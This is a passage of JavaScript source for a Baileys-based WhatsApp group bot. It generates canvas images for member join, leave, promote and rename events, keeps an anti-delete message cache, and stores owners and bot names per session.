const fs = require("fs");
const path = require("path");
const axios = require("axios");
const yts = require("yt-search");
const version = "3.0.0";
const chalk = require("chalk");
const crypto = require("crypto");
const ffmpeg = require("fluent-ffmpeg");
const { PassThrough } = require("stream");
const baileys = require("@whiskeysockets/baileys");
const { exec } = require("child_process");
const fetch = global.fetch || require("node-fetch");
const { loadJSON, saveJSON, runtime, formatBytes } = require("./helper/function.js");
const config = require("./settings.js");
const { requestPairingCode } = require("./whatsapp.js");
const { validatePhoneNumber } = require("./helper/generate.js");
const logger = require("./helper/logger.js");
const { logSystem } = require('./helper/logger.js'); // Adjust path as needed
const { logIncomingMessage, logGroupCommand } = require("./lib/chatLogger");
const { db, saveDB } = require("./lib/database");
const {
  PAIRING_COMMAND,
  getWhatsappUserId,
  resolveWhatsappAccountId,
  getPlanSummary,
  getWhatsappSubscription,
  createWhatsappPayment,
  verifyWhatsappPayment,
  canAddDevice,
  syncSessionToDb,
  PLANS,
} = require("./lib/whatsappBilling");
const os = require("os");
const { downloadMediaMessage, generateWAMessageFromContent, proto, prepareWAMessageMedia } = require("@whiskeysockets/baileys");

const pino = require("pino");

// ═══════════════════════════════════════════════════════════════════════════
// CANVAS — GROUP EVENT IMAGE GENERATOR
// Generates cute professional images for welcome, goodbye, and group events.
// Falls back to text if the 'canvas' package is not installed.
// ═══════════════════════════════════════════════════════════════════════════

// ═══════════════════════════════════════════════════════════════════════════
// CANVAS — GROUP EVENT IMAGE GENERATOR
// Generates cute professional images for welcome, goodbye, and group events.
// Falls back to text if the 'canvas' package is not installed.
// ═══════════════════════════════════════════════════════════════════════════
let _createCanvas = null;
let _loadImage = null;
try {
  const _canvasMod = require("canvas");
  _createCanvas = _canvasMod.createCanvas;
  _loadImage = _canvasMod.loadImage;
} catch {}

function _roundedRect(ctx, x, y, w, h, r) {
  ctx.beginPath();
  ctx.moveTo(x + r, y); ctx.lineTo(x + w - r, y);
  ctx.quadraticCurveTo(x + w, y, x + w, y + r);
  ctx.lineTo(x + w, y + h - r);
  ctx.quadraticCurveTo(x + w, y + h, x + w - r, y + h);
  ctx.lineTo(x + r, y + h);
  ctx.quadraticCurveTo(x, y + h, x, y + h - r);
  ctx.lineTo(x, y + r);
  ctx.quadraticCurveTo(x, y, x + r, y);
  ctx.closePath();
}

function _truncate(str, max) {
  return str && str.length > max ? str.slice(0, max) + "…" : str || "";
}

function _drawAvatarFallback(ctx, cx, cy, radius, accent) {
  const grad = ctx.createRadialGradient(cx, cy - radius * 0.15, radius * 0.1, cx, cy, radius);
  grad.addColorStop(0, "#1e2a1e"); grad.addColorStop(1, "#0a120a");
  ctx.fillStyle = grad; ctx.fill();
  ctx.globalAlpha = 0.65; ctx.fillStyle = accent;
  ctx.beginPath(); ctx.arc(cx, cy - radius * 0.18, radius * 0.36, 0, Math.PI * 2); ctx.fill();
  ctx.beginPath(); ctx.ellipse(cx, cy + radius * 0.52, radius * 0.52, radius * 0.38, 0, Math.PI, 0); ctx.fill();
  ctx.globalAlpha = 1;
}



async function _drawAvatar(ctx, cx, cy, radius, profilePicUrl, accent) {
  ctx.save();
  ctx.shadowColor = accent;
  ctx.shadowBlur = 28;
  ctx.beginPath(); ctx.arc(cx, cy, radius + 6, 0, Math.PI * 2);
  ctx.strokeStyle = accent; ctx.lineWidth = 3.5; ctx.stroke();
  ctx.shadowBlur = 0;
  ctx.beginPath(); ctx.arc(cx, cy, radius, 0, Math.PI * 2); ctx.closePath(); ctx.clip();
  if (profilePicUrl && _loadImage) {
    try {
      const img = await _loadImage(profilePicUrl);
      ctx.drawImage(img, cx - radius, cy - radius, radius * 2, radius * 2);
    } catch { _drawAvatarFallback(ctx, cx, cy, radius, accent); }
  } else {
    _drawAvatarFallback(ctx, cx, cy, radius, accent);
  }
  ctx.restore();
}

function _drawBrandFooter(ctx, W, y, botName, accent) {
  ctx.globalAlpha = 0.14; ctx.strokeStyle = "#ffffff"; ctx.lineWidth = 1;
  ctx.beginPath(); ctx.moveTo(120, y - 14); ctx.lineTo(W - 120, y - 14); ctx.stroke();
  ctx.globalAlpha = 1;
  ctx.font = "italic 13px Arial"; ctx.fillStyle = "rgba(255,255,255,0.4)"; ctx.textAlign = "center";
  ctx.fillText(`🤖 ${botName}  •  Mzazi Tech Inc`, W / 2, y);
}

async function generateWelcomeImage({ memberNumber, groupName, memberCount, profilePicUrl }) {
  if (!_createCanvas) return null;
  const W = 800, H = 570;
  const canvas = _createCanvas(W, H);
  const ctx = canvas.getContext("2d");
  const A = "#1fdb7e", A2 = "#00ffaa";
  const botName = config.botName || "MZAZI TECH QUARTZ BOT";

  const bg = ctx.createLinearGradient(0, 0, W, H);
  bg.addColorStop(0, "#051810"); bg.addColorStop(0.5, "#0c3820"); bg.addColorStop(1, "#051810");
  ctx.fillStyle = bg; ctx.fillRect(0, 0, W, H);

  ctx.globalAlpha = 0.055; ctx.fillStyle = A;
  ctx.beginPath(); ctx.arc(720, 80, 160, 0, Math.PI * 2); ctx.fill();
  ctx.beginPath(); ctx.arc(70, 490, 120, 0, Math.PI * 2); ctx.fill();
  ctx.globalAlpha = 0.09; ctx.fillStyle = "#ffffff";
  [[55,55,2.5],[195,28,1.5],[620,28,2],[752,62,1.5],[38,200,1],[782,195,1.5],
   [88,400,2],[712,430,1.5],[400,18,2],[350,555,1.5],[650,510,1],[130,530,1.2]]
    .forEach(([dx,dy,dr]) => { ctx.beginPath(); ctx.arc(dx,dy,dr,0,Math.PI*2); ctx.fill(); });
  ctx.globalAlpha = 1;

  const bar = ctx.createLinearGradient(0, 0, W, 0);
  bar.addColorStop(0, A); bar.addColorStop(0.5, A2); bar.addColorStop(1, A);
  ctx.fillStyle = bar; ctx.fillRect(0, 0, W, 8);
  ctx.fillStyle = bar; ctx.fillRect(0, H - 8, W, 8);

  ctx.globalAlpha = 0.09; _roundedRect(ctx, 38, 22, W - 76, H - 44, 32);
  ctx.fillStyle = "#ffffff"; ctx.fill();
  ctx.globalAlpha = 0.16; ctx.strokeStyle = A; ctx.lineWidth = 1.5;
  _roundedRect(ctx, 38, 22, W - 76, H - 44, 32); ctx.stroke();
  ctx.globalAlpha = 1;

  await _drawAvatar(ctx, W / 2, 148, 82, profilePicUrl, A);

  const tg = ctx.createLinearGradient(180, 0, 620, 0);
  tg.addColorStop(0, A); tg.addColorStop(0.5, A2); tg.addColorStop(1, A);
  ctx.font = "bold 58px Arial"; ctx.fillStyle = tg; ctx.textAlign = "center";
  ctx.shadowColor = "rgba(0,220,100,0.45)"; ctx.shadowBlur = 20;
  ctx.fillText("🎉  WELCOME!", W / 2, 295); ctx.shadowBlur = 0;

  ctx.font = "bold 27px Arial"; ctx.fillStyle = "#ffffff";
  ctx.fillText(`+${memberNumber}`, W / 2, 335);

  const bW = 290, bH = 36, bX = (W - bW) / 2, bY = 352;
  ctx.globalAlpha = 0.22; _roundedRect(ctx, bX, bY, bW, bH, 18);
  ctx.fillStyle = A; ctx.fill();
  ctx.globalAlpha = 0.45; ctx.strokeStyle = A2; ctx.lineWidth = 1;
  _roundedRect(ctx, bX, bY, bW, bH, 18); ctx.stroke(); ctx.globalAlpha = 1;
  ctx.font = "bold 15px Arial"; ctx.fillStyle = A2;
  ctx.fillText("✅   JOINED THE GROUP", W / 2, bY + 24);

  ctx.globalAlpha = 0.18; ctx.strokeStyle = A; ctx.lineWidth = 1;
  ctx.beginPath(); ctx.moveTo(160, 406); ctx.lineTo(W - 160, 406); ctx.stroke(); ctx.globalAlpha = 1;

  ctx.font = "21px Arial"; ctx.fillStyle = "rgba(255,255,255,0.85)";
  ctx.fillText(`📌  ${_truncate(groupName, 36)}`, W / 2, 440);

  ctx.font = "bold 16px Arial"; ctx.fillStyle = A;
  ctx.fillText(`👥  Member #${memberCount}`, W / 2, 474);

  ctx.font = "14px Arial"; ctx.fillStyle = "rgba(255,255,255,0.32)";
  ctx.fillText("We are so glad to have you here ✨", W / 2, 502);

  _drawBrandFooter(ctx, W, 534, botName, A);

  return canvas.toBuffer("image/png");
}

async function generateGoodbyeImage({ memberNumber, groupName, profilePicUrl }) {
  if (!_createCanvas) return null;
  const W = 800, H = 540;
  const canvas = _createCanvas(W, H);
  const ctx = canvas.getContext("2d");
  const A = "#e94560", A2 = "#ff6b8a";
  const botName = config.botName || "MZAZI TECH QUARTZ BOT";

  const bg = ctx.createLinearGradient(0, 0, W, H);
  bg.addColorStop(0, "#0e0c1e"); bg.addColorStop(0.5, "#1a1438"); bg.addColorStop(1, "#0e0c1e");
  ctx.fillStyle = bg; ctx.fillRect(0, 0, W, H);

  ctx.globalAlpha = 0.055; ctx.fillStyle = A;
  ctx.beginPath(); ctx.arc(700, 80, 150, 0, Math.PI * 2); ctx.fill();
  ctx.beginPath(); ctx.arc(80, 470, 110, 0, Math.PI * 2); ctx.fill();
  ctx.globalAlpha = 0.12; ctx.fillStyle = "#ffffff";
  [[78,48,2.5],[198,76,1.5],[352,36,2],[502,68,1.5],[658,36,2.5],[742,88,1.5],
   [142,400,1.5],[302,418,2],[482,440,1.5],[618,408,2],[718,388,1.5],[58,235,1],[775,225,1.5]]
    .forEach(([sx,sy,sr]) => { ctx.beginPath(); ctx.arc(sx,sy,sr,0,Math.PI*2); ctx.fill(); });
  ctx.globalAlpha = 1;

  const bar = ctx.createLinearGradient(0, 0, W, 0);
  bar.addColorStop(0, A); bar.addColorStop(0.5, A2); bar.addColorStop(1, A);
  ctx.fillStyle = bar; ctx.fillRect(0, 0, W, 8);
  ctx.fillStyle = bar; ctx.fillRect(0, H - 8, W, 8);

  ctx.globalAlpha = 0.09; _roundedRect(ctx, 38, 22, W - 76, H - 44, 32);
  ctx.fillStyle = "#ffffff"; ctx.fill();
  ctx.globalAlpha = 0.16; ctx.strokeStyle = A; ctx.lineWidth = 1.5;
  _roundedRect(ctx, 38, 22, W - 76, H - 44, 32); ctx.stroke(); ctx.globalAlpha = 1;

  await _drawAvatar(ctx, W / 2, 140, 78, profilePicUrl, A);

  const tg = ctx.createLinearGradient(180, 0, 620, 0);
  tg.addColorStop(0, A); tg.addColorStop(0.5, A2); tg.addColorStop(1, A);
  ctx.font = "bold 56px Arial"; ctx.fillStyle = tg; ctx.textAlign = "center";
  ctx.shadowColor = "rgba(233,69,96,0.5)"; ctx.shadowBlur = 20;
  ctx.fillText("🌙  GOODBYE...", W / 2, 278); ctx.shadowBlur = 0;

  ctx.font = "bold 27px Arial"; ctx.fillStyle = "#ffffff";
  ctx.fillText(`+${memberNumber}`, W / 2, 316);

  const bW = 280, bH = 36, bX = (W - bW) / 2, bY = 333;
  ctx.globalAlpha = 0.2; _roundedRect(ctx, bX, bY, bW, bH, 18);
  ctx.fillStyle = A; ctx.fill();
  ctx.globalAlpha = 0.4; ctx.strokeStyle = A2; ctx.lineWidth = 1;
  _roundedRect(ctx, bX, bY, bW, bH, 18); ctx.stroke(); ctx.globalAlpha = 1;
  ctx.font = "bold 15px Arial"; ctx.fillStyle = A2;
  ctx.fillText("👋   LEFT THE GROUP", W / 2, bY + 24);

  ctx.globalAlpha = 0.18; ctx.strokeStyle = A; ctx.lineWidth = 1;
  ctx.beginPath(); ctx.moveTo(160, 385); ctx.lineTo(W - 160, 385); ctx.stroke(); ctx.globalAlpha = 1;

  ctx.font = "21px Arial"; ctx.fillStyle = "rgba(255,255,255,0.82)";
  ctx.fillText(`📌  ${_truncate(groupName, 36)}`, W / 2, 418);

  ctx.font = "italic 14px Arial"; ctx.fillStyle = "rgba(255,255,255,0.34)";
  ctx.fillText("Thank you for being part of our family 💙", W / 2, 452);
  ctx.fillText("Until we meet again... 🌠", W / 2, 474);

  _drawBrandFooter(ctx, W, 506, botName, A);

  return canvas.toBuffer("image/png");
}

async function generateEventImage({ memberNumber, eventType, groupName, details = "", profilePicUrl }) {
  if (!_createCanvas) return null;
  const W = 800, H = 540;
  const canvas = _createCanvas(W, H);
  const ctx = canvas.getContext("2d");
  const botName = config.botName || "MZAZI TECH QUARTZ BOT";

  const THEMES = {
    promote:     { bg:["#120a28","#261650","#120a28"], A:"#f0c040", A2:"#ffd700", badge:"👑   PROMOTED TO ADMIN",    title:"PROMOTED!" },
    demote:      { bg:["#200e00","#3e1c00","#200e00"], A:"#ff8c42", A2:"#ffa760", badge:"📉   ADMIN RIGHTS REMOVED",  title:"DEMOTED"   },
    remove:      { bg:["#180000","#300000","#180000"], A:"#e94560", A2:"#ff6b8a", badge:"🚪   REMOVED FROM GROUP",    title:"REMOVED"   },
    add:         { bg:["#051810","#0c3820","#051810"], A:"#1fdb7e", A2:"#00ffaa", badge:"✅   JOINED THE GROUP",      title:"JOINED!"   },
    description: { bg:["#090f28","#10204a","#090f28"], A:"#5b9fff", A2:"#7eb8ff", badge:"📝   DESCRIPTION UPDATED",  title:"INFO UPDATE"},
    subject:     { bg:["#180e00","#2e1c00","#180e00"], A:"#ffcc44", A2:"#ffe066", badge:"✏️   GROUP RENAMED",         title:"RENAMED"   },
    default:     { bg:["#090f28","#101e3c","#090f28"], A:"#4a9fff", A2:"#73b4ff", badge:"📢   GROUP EVENT",           title:"UPDATE"    },
  };
  const t = THEMES[eventType] || THEMES.default;

  const bg = ctx.createLinearGradient(0, 0, W, H);
  bg.addColorStop(0, t.bg[0]); bg.addColorStop(0.5, t.bg[1]); bg.addColorStop(1, t.bg[2]);
  ctx.fillStyle = bg; ctx.fillRect(0, 0, W, H);

  ctx.globalAlpha = 0.055; ctx.fillStyle = t.A;
  ctx.beginPath(); ctx.arc(700, 80, 150, 0, Math.PI * 2); ctx.fill();
  ctx.beginPath(); ctx.arc(80, 470, 110, 0, Math.PI * 2); ctx.fill();
  ctx.globalAlpha = 0.1; ctx.fillStyle = "#ffffff";
  [[50,48,2.5],[190,26,1.5],[630,24,2],[752,58,1.5],[38,208,1],[782,198,1.5],[78,408,2],[718,418,1.5]]
    .forEach(([px,py,pr]) => { ctx.beginPath(); ctx.arc(px,py,pr,0,Math.PI*2); ctx.fill(); });
  ctx.globalAlpha = 1;

  const bar = ctx.createLinearGradient(0, 0, W, 0);
  bar.addColorStop(0, t.A); bar.addColorStop(0.5, t.A2); bar.addColorStop(1, t.A);
  ctx.fillStyle = bar; ctx.fillRect(0, 0, W, 8);
  ctx.fillStyle = bar; ctx.fillRect(0, H - 8, W, 8);

  ctx.globalAlpha = 0.09; _roundedRect(ctx, 38, 22, W - 76, H - 44, 32);
  ctx.fillStyle = "#ffffff"; ctx.fill();
  ctx.globalAlpha = 0.16; ctx.strokeStyle = t.A; ctx.lineWidth = 1.5;
  _roundedRect(ctx, 38, 22, W - 76, H - 44, 32); ctx.stroke(); ctx.globalAlpha = 1;

  await _drawAvatar(ctx, W / 2, 140, 76, profilePicUrl, t.A);

  const tg = ctx.createLinearGradient(180, 0, 620, 0);
  tg.addColorStop(0, t.A); tg.addColorStop(0.5, t.A2); tg.addColorStop(1, t.A);
  ctx.font = "bold 54px Arial"; ctx.fillStyle = tg; ctx.textAlign = "center";
  ctx.shadowColor = t.A + "88"; ctx.shadowBlur = 20;
  ctx.fillText(t.title, W / 2, 278); ctx.shadowBlur = 0;

  if (memberNumber) {
    ctx.font = "bold 26px Arial"; ctx.fillStyle = "#ffffff";
    ctx.fillText(`+${memberNumber}`, W / 2, 316);
  }

  const bW = 320, bH = 36, bX = (W - bW) / 2, bY = memberNumber ? 333 : 316;
  ctx.globalAlpha = 0.2; _roundedRect(ctx, bX, bY, bW, bH, 18);
  ctx.fillStyle = t.A; ctx.fill();
  ctx.globalAlpha = 0.4; ctx.strokeStyle = t.A2; ctx.lineWidth = 1;
  _roundedRect(ctx, bX, bY, bW, bH, 18); ctx.stroke(); ctx.globalAlpha = 1;
  ctx.font = "bold 14px Arial"; ctx.fillStyle = t.A2;
  ctx.fillText(t.badge, W / 2, bY + 24);

  ctx.globalAlpha = 0.18; ctx.strokeStyle = t.A; ctx.lineWidth = 1;
  ctx.beginPath(); ctx.moveTo(160, 390); ctx.lineTo(W - 160, 390); ctx.stroke(); ctx.globalAlpha = 1;

  ctx.font = "21px Arial"; ctx.fillStyle = "rgba(255,255,255,0.82)";
  ctx.fillText(`📌  ${_truncate(groupName, 36)}`, W / 2, 424);

  if (details && details !== t.badge) {
    ctx.font = "italic 14px Arial"; ctx.fillStyle = "rgba(255,255,255,0.38)";
    ctx.fillText(_truncate(details, 60), W / 2, 456);
  }

  ctx.font = "13px Arial"; ctx.fillStyle = "rgba(255,255,255,0.25)";
  ctx.fillText(new Date().toLocaleString(), W / 2, 476);

  _drawBrandFooter(ctx, W, 506, botName, t.A);

  return canvas.toBuffer("image/png");
}

// ── Group participant event handler (register in whatsapp.js) ────────────────
// mzazi.ev.on("group-participants.update", (u) => handleGroupParticipantsUpdate(mzazi, u));
// mzazi.ev.on("groups.update", (u) => handleGroupsUpdateEvent(mzazi, u));

async function handleGroupParticipantsUpdate(mzazi, update) {
  try {
    const { id: groupJid, participants, action } = update;
    if (!groupJid || !participants?.length) return;
    const botPhoneNum = mzazi.user?.id?.split("@")[0]?.split(":")[0] ?? "";
    const sessFile = (name) => `./database/sessions/${botPhoneNum}/${name}`;
    const _loadJ = (p, d) => { try { return JSON.parse(fs.readFileSync(p, "utf8")); } catch { return d; } };
    const gs = (_loadJ(sessFile("groups.json"), {}))[groupJid] || {};

    let groupName = groupJid, memberCount = 0;
    try { const meta = await mzazi.groupMetadata(groupJid); groupName = meta.subject || groupJid; memberCount = meta.participants?.length || 0; } catch {}

    for (const participantJid of participants) {
      const memberNumber = participantJid.split("@")[0].split(":")[0].replace(/\D/g, "");

      // Fetch profile picture — silently fall back to null if unavailable
      let profilePicUrl = null;
      try { profilePicUrl = await mzazi.profilePictureUrl(participantJid, "image"); } catch {}

      if (action === "add" && gs.welcome) {
        const caption =
          `╔════════════════════╗\n║   🎉 *WELCOME* 🎉   ║\n╚════════════════════╝\n\n` +
          `✨ @${memberNumber} just joined!\n\n📌 *Group:* ${groupName}\n👥 *Total Members:* ${memberCount}\n\n_We are so glad to have you here!_ 🌟`;
        try {
          const img = await generateWelcomeImage({ memberNumber, groupName, memberCount, profilePicUrl });
          if (img) await mzazi.sendMessage(groupJid, { image: img, caption, mentions: [participantJid] });
          else await mzazi.sendMessage(groupJid, { text: caption, mentions: [participantJid] });
        } catch { await mzazi.sendMessage(groupJid, { text: `👋 Welcome @${memberNumber}! 🎉`, mentions: [participantJid] }).catch(() => {}); }
      }

      else if (action === "remove" && gs.goodbye) {
        const caption =
          `╔════════════════════╗\n║   🌙 *GOODBYE* 🌙   ║\n╚════════════════════╝\n\n` +
          `💔 @${memberNumber} has left.\n\n📌 *Group:* ${groupName}\n\n_Thank you for being with us. Until we meet again..._ 🌠`;
        try {
          const img = await generateGoodbyeImage({ memberNumber, groupName, profilePicUrl });
          if (img) await mzazi.sendMessage(groupJid, { image: img, caption, mentions: [participantJid] });
          else await mzazi.sendMessage(groupJid, { text: caption, mentions: [participantJid] });
        } catch { await mzazi.sendMessage(groupJid, { text: `👋 Goodbye @${memberNumber}! 💙`, mentions: [participantJid] }).catch(() => {}); }
      }

      else if (action === "promote" && gs.events) {
        const caption =
          `╔════════════════════╗\n║  👑 *PROMOTED!* 👑  ║\n╚════════════════════╝\n\n` +
          `⭐ @${memberNumber} has been promoted!\n🎖️ *New Role:* Admin\n\n📌 *Group:* ${groupName}\n\n_Congratulations! 🎉_`;
        try {
          const img = await generateEventImage({ memberNumber, eventType: "promote", groupName, profilePicUrl });
          if (img) await mzazi.sendMessage(groupJid, { image: img, caption, mentions: [participantJid] });
          else await mzazi.sendMessage(groupJid, { text: caption, mentions: [participantJid] });
        } catch { await mzazi.sendMessage(groupJid, { text: `👑 @${memberNumber} promoted to Admin! 🎉`, mentions: [participantJid] }).catch(() => {}); }
      }

      else if (action === "demote" && gs.events) {
        const caption =
          `╔════════════════════╗\n║  📉 *DEMOTED* 📉   ║\n╚════════════════════╝\n\n` +
          `@${memberNumber} has been demoted.\n🔻 *Admin rights removed*\n\n📌 *Group:* ${groupName}`;
        try {
          const img = await generateEventImage({ memberNumber, eventType: "demote", groupName, profilePicUrl });
          if (img) await mzazi.sendMessage(groupJid, { image: img, caption, mentions: [participantJid] });
          else await mzazi.sendMessage(groupJid, { text: caption, mentions: [participantJid] });
        } catch { await mzazi.sendMessage(groupJid, { text: `📉 @${memberNumber} demoted from Admin.`, mentions: [participantJid] }).catch(() => {}); }
      }
    }
  } catch (e) { logger.error("[GroupEvents] handleGroupParticipantsUpdate error:", e?.message); }
}

async function handleGroupsUpdateEvent(mzazi, updates) {
  const botPhoneNum = mzazi.user?.id?.split("@")[0]?.split(":")[0] ?? "";
  const _loadJ = (p, d) => { try { return JSON.parse(fs.readFileSync(p, "utf8")); } catch { return d; } };
  for (const update of updates) {
    try {
      const groupJid = update.id;
      if (!groupJid) continue;
      const gs = (_loadJ(`./database/sessions/${botPhoneNum}/groups.json`, {}))[groupJid] || {};
      if (!gs.events) continue;
      let groupName = groupJid;
      try { const meta = await mzazi.groupMetadata(groupJid); groupName = meta.subject || groupJid; } catch {}

      if (update.subject !== undefined) {
        const caption = `╔════════════════════╗\n║  ✏️ *RENAMED* ✏️   ║\n╚════════════════════╝\n\n📌 Group name changed to:\n*${update.subject}*`;
        try {
          const img = await generateEventImage({ memberNumber: "", eventType: "subject", groupName: update.subject, details: `Was: ${groupName}` });
          if (img) await mzazi.sendMessage(groupJid, { image: img, caption });
          else await mzazi.sendMessage(groupJid, { text: caption });
        } catch { await mzazi.sendMessage(groupJid, { text: caption }).catch(() => {}); }
      }

      if (update.desc !== undefined) {
        const caption = `╔════════════════════╗\n║  📝 *INFO UPDATE* 📝║\n╚════════════════════╝\n\n📌 *Group:* ${groupName}\n\nNew description:\n_${_truncate(update.desc, 200)}_`;
        try {
          const img = await generateEventImage({ memberNumber: "", eventType: "description", groupName, details: _truncate(update.desc, 60) });
          if (img) await mzazi.sendMessage(groupJid, { image: img, caption });
          else await mzazi.sendMessage(groupJid, { text: caption });
        } catch { await mzazi.sendMessage(groupJid, { text: caption }).catch(() => {}); }
      }
    } catch (e) { logger.error("[GroupEvents] handleGroupsUpdateEvent error:", e?.message); }
  }
}

// ========================== HELPERS =========================

// ─────────────────────────────────────────────────────────────────────────────
// STICKER COMMAND SYSTEM — STARTUP LOADER
// PLACEMENT: Near the very top of the file, before module.exports handler.
//
// Loads the sticker→command map from disk into memory so every incoming
// message can be matched instantly without a disk read per message.
// ─────────────────────────────────────────────────────────────────────────────

/**
 * Strips domain, device suffix (:0, :2, etc.) and non-numeric chars.
 * "123456789:0@s.whatsapp.net" → "123456789"
 * "123456789@g.us"             → "123456789"
 * "123456789@s.whatsapp.net"   → "123456789"
 */
const normalizeJid = (jid = "") => {
  if (!jid || typeof jid !== "string") return "";
  return jid.split("@")[0].split(":")[0].replace(/[^0-9]/g, "");
};

const jidToNumber = (jid) => {
  if (!jid || typeof jid !== "string") return "";
  return jid.split("@")[0].split(":")[0];
};

const ensureDir = (dir) => {
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
};

const URL_REGEX = /(https?:\/\/[^\s]+|wa\.me\/[^\s]+|chat\.whatsapp\.com\/[^\s]+|www\.[^\s]+)/i;

// ========================== DATABASE ==========================
// paidUsers is now per-session — loaded inside handler after botPhoneNum is known
// Legacy global kept as empty fallback so nothing breaks before botPhoneNum resolves
const paidUsers = [];
const savePaidData = () => {};

// ── ANTI-DELETE MESSAGE CACHE ──────────────────────────────────────────────
// Baileys revoke payloads refer to the original message key. Keep the chat,
// participant, and device in the cache key so identical IDs from different
// chats cannot restore the wrong message.
const messageCache = new Map();
const antiDeleteCacheKey = (key = {}, fallbackChatId = "") => [
  key.remoteJid || fallbackChatId || "",
  key.participant || "",
  key.fromMe ? "1" : "0",
  key.id || "",
].join("|");

const findCachedAntiDeleteMessage = (revokedKey = {}) => {
  if (!revokedKey.id) return null;

  const exact = messageCache.get(antiDeleteCacheKey(revokedKey));
  if (exact) return exact;

  // Some Baileys versions omit remoteJid/participant from the revoke key.
  // Search by ID, preferring matching chat and participant when available.
  const matches = [...messageCache.values()].filter((item) => item.key?.id === revokedKey.id);
  if (!matches.length) return null;
  return matches.find((item) =>
    (!revokedKey.remoteJid || item.key.remoteJid === revokedKey.remoteJid) &&
    (!revokedKey.participant || item.key.participant === revokedKey.participant)
  ) || matches[0];
};

const deleteCachedAntiDeleteMessage = (cached) => {
  if (cached?.cacheKey) messageCache.delete(cached.cacheKey);
};

const unwrapAntiDeleteMessage = (message) => {
  let current = message;
  for (let i = 0; i < 4; i += 1) {
    const next = current?.ephemeralMessage?.message ||
      current?.viewOnceMessage?.message ||
      current?.viewOnceMessageV2?.message ||
      current?.viewOnceMessageV2Extension?.message;
    if (!next) break;
    current = next;
  }
  return current || {};
};

setInterval(() => {
  const cutoff = Date.now() - 15 * 60 * 1000;
  for (const [cacheKey, data] of messageCache.entries()) {
    if (data.ts < cutoff) messageCache.delete(cacheKey);
  }
}, 60000);




const owners = loadJSON("./database/owners.json", []);
const saveOwners = () => saveJSON("./database/owners.json", owners);
const getOwners = () => owners;
const addOwner = (num) => {
  if (!owners.includes(num)) {
    owners.push(num);
    saveOwners();
  }
};
const delOwner = (num) => {
  const i = owners.indexOf(num);
  if (i !== -1) {
    owners.splice(i, 1);
    saveOwners();
  }
};

const getBotName = (phoneNum) => {
  if (phoneNum) {
    const s = loadJSON(`./database/sessions/${phoneNum}/botSettings.json`, {});
    if (s.botName) return s.botName;
  }
  return config.botName || "Mzazi";
};

const setBotName = (phoneNum, name) => {
  const dir = `./database/sessions/${phoneNum}`;
  ensureDir(dir);
  const p = `${dir}/botSettings.json`;
  const s = loadJSON(p, {});
  s.botName = name;
  saveJSON(p, s);
};

const getBody = (message) => {
  if (!message) return "";
  const type = Object.keys(message)[0];
  try {
    if (type === "conversation") return message.conversation || "";
    if (type === "extendedTextMessage") return message.extendedTextMessage.text || "";
    if (type === "imageMessage") return message.imageMessage.caption || "";
    if (type === "videoMessage") return message.videoMessage.caption || "";
    if (type === "templateButtonReplyMessage") return message.templateButtonReplyMessage.selectedId || "";
    if (type === "buttonsResponseMessage") return message.buttonsResponseMessage.selectedButtonId || "";
    if (type === "listResponseMessage") return message.listResponseMessage.singleSelectReply?.selectedRowId || "";
    if (type === "interactiveResponseMessage") {
      const ir = message.interactiveResponseMessage;
      if (ir.nativeFlowResponseMessage?.paramsJson) {
        return JSON.parse(ir.nativeFlowResponseMessage.paramsJson).id || "";
      }
      return ir.body || "";
    }
  } catch (e) {
    return "";
  }
  return "";
};

const pickTargetNumber = (m, text) => {
  const mentioned = m.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
  const quoted = m.message?.extendedTextMessage?.contextInfo?.participant;
  if (mentioned[0]) return jidToNumber(mentioned[0]);
  if (quoted) return jidToNumber(quoted);
  return (text || "").replace(/\D/g, "");
};

// ========== PENDING SONG STORE (in-memory, expires after 2 minutes) ==========
const songRequests = new Map();
setInterval(() => {
  const now = Date.now();
  for (const [jid, data] of songRequests.entries()) {
    if (now - data.timestamp > 120000) songRequests.delete(jid);
  }
}, 30000);

// ========================== MAIN HANDLER ==========================
module.exports = async (mzazi, m) => {
  try {

    // ── GROUP EVENT STUBS ─────────────────────────────────────────────────────
    // Group join / leave / promote / demote / rename events arrive as stub
    // messages where m.message is null — they MUST be handled before the early
    // return below, otherwise they are silently dropped.
    //
    // Stub type reference (@whiskeysockets/baileys):
    //   26 = GROUP_PARTICIPANT_INVITE   27 = GROUP_PARTICIPANT_ADD
    //   28 = GROUP_PARTICIPANT_REMOVE   31 = GROUP_PARTICIPANT_PROMOTE
    //   32 = GROUP_PARTICIPANT_DEMOTE   11 = GROUP_CHANGE_SUBJECT
    //   12 = GROUP_CHANGE_DESCRIPTION
    // ─────────────────────────────────────────────────────────────────────────
    const _STUB = m.messageStubType;
    const _stubGrp = m.key?.remoteJid;
    if (_STUB && _stubGrp && _stubGrp.endsWith("@g.us")) {
      const _botPN3 = mzazi.user?.id?.split("@")[0]?.split(":")[0] ?? "";
      const _grpPath = `./database/sessions/${_botPN3}/groups.json`;
      const _gs3 = (() => {
        try { return JSON.parse(fs.readFileSync(_grpPath, "utf8"))[_stubGrp] || {}; }
        catch { return {}; }
      })();

      // Resolve group name + member count (best-effort)
      let _gName3 = _stubGrp, _mCount3 = 0;
      try {
        const _meta3 = await mzazi.groupMetadata(_stubGrp);
        _gName3  = _meta3.subject || _stubGrp;
        _mCount3 = _meta3.participants?.length || 0;
      } catch {}

      const _stubs3 = m.messageStubParameters || [];

      // Helper: send image with text fallback
      const _send3 = async (imgBuf, caption, mentions) => {
        try {
          if (imgBuf) {
            await mzazi.sendMessage(_stubGrp, { image: imgBuf, caption, mentions });
          } else {
            await mzazi.sendMessage(_stubGrp, { text: caption, mentions });
          }
        } catch {
          await mzazi.sendMessage(_stubGrp, { text: caption, mentions }).catch(() => {});
        }
      };



      // ── JOIN (invite or add) ────────────────────────────────────────────
      if ((_STUB === 27 || _STUB === 26) && _gs3.welcome) {
        for (const pJid of _stubs3) {
          const mn = pJid.split("@")[0].split(":")[0].replace(/\D/g, "");
          let _ppic3 = null;
          try { _ppic3 = await mzazi.profilePictureUrl(pJid, "image"); } catch {}
          const cap =
            `╔════════════════════╗\n` +
            `║   🎉 *WELCOME* 🎉   ║\n` +
            `╚════════════════════╝\n\n` +
            `✨ @${mn} just joined!\n\n` +
            `📌 *Group:* ${_gName3}\n` +
            `👥 *Total Members:* ${_mCount3}\n\n` +
            `_We are so glad to have you here!_ 🌟`;
          const img = await generateWelcomeImage({ memberNumber: mn, groupName: _gName3, memberCount: _mCount3, profilePicUrl: _ppic3 }).catch(() => null);
          await _send3(img, cap, [pJid]);
        }
      }

